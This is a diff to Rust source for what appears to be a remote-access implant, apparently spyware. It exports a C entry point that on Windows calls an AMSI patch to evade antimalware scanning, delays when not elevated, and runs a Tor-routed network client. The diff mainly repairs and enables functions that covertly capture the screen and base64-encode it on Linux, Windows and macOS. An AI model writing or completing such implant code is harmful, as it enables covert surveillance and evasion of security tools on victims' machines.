@@ -22,27 +22,27 @@ use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 #[cfg(target_os = "windows")]
 use zstd::zstd_safe::OutBuffer;
-#[cfg(target_os = "linux")]
-use core::ffi::c_str::Bytes;
+//#[cfg(target_os = "linux")]
+//use core::ffi::c_str::Bytes;
 use core::task;
-use std::{fs};
+use std::{fs,env};
 use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
 use libc::{c_int};
 
 #[cfg(target_os = "windows")]
-use screenshots::{*};
+use screenshots::{Screen};
 #[cfg(target_os = "macos")]
-use screenshots::{*};
+use screenshots::{Screen};
 #[cfg(target_os = "linux")]
-use screenshots::{*};
+use screenshots::{Screen};
 
 #[cfg(target_os = "windows")]
-use image::{*};
+use screenshots::image::ImageOutputFormat;
 #[cfg(target_os = "macos")]
-use image::{*};
+use screenshots::image::ImageOutputFormat;
 #[cfg(target_os = "linux")]
-use image::{*};
+use screenshots::image::ImageOutputFormat;
 
 
 
@@ -83,39 +83,68 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     println!("Initialized Tor Client");
     Ok(client)
 }
-/*/#[cfg(target_os = "linux")]
+#[cfg(target_os = "linux")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
-    Pixels::map_windows( f)
-    let image_buffer = screen.capture()?;
-    let mut buf = (image_buffer)
-    image_buffer.write_to(&buf, Png)?;
-    let encoded = general_purpose::STANDARD.encode(buf); 
-    Ok(format!("{}",encoded))
+
+    // Capture screenshot
+    let image = screen.capture()?;
+
+    // Encode PNG into memory
+    let mut png_bytes: Vec<u8> = Vec::new();
+
+    image.write_to(
+        &mut std::io::Cursor::new(&mut png_bytes),
+        ImageOutputFormat::Png,
+    )?;
+
+    // Convert PNG bytes -> base64
+    let b64 = general_purpose::STANDARD.encode(&png_bytes);
+    Ok(format!("{}",b64))
 }
 #[cfg(target_os = "windows")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
-    let image_buffer = screen.capture()?;
-    let mut buf = ImageBuffer::new(3000,3000);
-    image_buffer.
-    let encoded = general_purpose::STANDARD.encode(concat_bytes!(&buf.to_vec())); 
-    Ok(format!("{}",encoded))
+
+    // Capture screenshot
+    let image = screen.capture()?;
+
+    // Encode PNG into memory
+    let mut png_bytes: Vec<u8> = Vec::new();
+
+
+    image.write_to(
+        &mut std::io::Cursor::new(&mut png_bytes),
+        ImageOutputFormat::Png,
+    )?;
+
+    // Convert PNG bytes -> base64
+    let b64 = general_purpose::STANDARD.encode(&png_bytes);
+    Ok(format!("{}",b64))
 }
 #[cfg(target_os = "macos")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
-    let image_buffer = screen.capture()?;
-    let mut buf = ImageBuffer::new(3000,3000);
-    image_buffer.write_to(&buf, Png)?;
-    let encoded = general_purpose::STANDARD.encode(buf); 
-    Ok(format!("{}",encoded))
-}
-**/
 
+    // Capture screenshot
+    let image = screen.capture()?;
+
+    // Encode PNG into memory
+    let mut png_bytes: Vec<u8> = Vec::new();
+
+
+    image.write_to(
+        &mut std::io::Cursor::new(&mut png_bytes),
+        ImageOutputFormat::Png,
+    )?;
+
+    // Convert PNG bytes -> base64
+    let b64 = general_purpose::STANDARD.encode(&png_bytes);
+    Ok(format!("{}",b64))
+}
 // different implementation on android
 #[cfg(target_os = "android")]
 fn take_screenshot_base64()-> anyhow::Result<String>{
@@ -387,7 +416,11 @@ pub async extern "C" fn netclient()->  c_int {
     amsi_patch::amsi_patch();
 
     #[cfg(target_os = "windows")]
-    let exe_path = env::current_exe()?;
+    let exe_path = match std::env::current_exe() {
+        Ok(p) => p,
+        Err(_) => return 1,
+    };
+
 
     #[cfg(target_os = "windows")]
     let exe_str = exe_path.to_string_lossy().to_string();
@@ -406,6 +439,6 @@ pub async extern "C" fn netclient()->  c_int {
     if !is_elevated(){
         sleep(Duration::from_secs(61)).await;
     }
-    netclient_run(ClientConfig::default()).await;
+    let _ = netclient_run(ClientConfig::default()).await;
     return 0;
 }
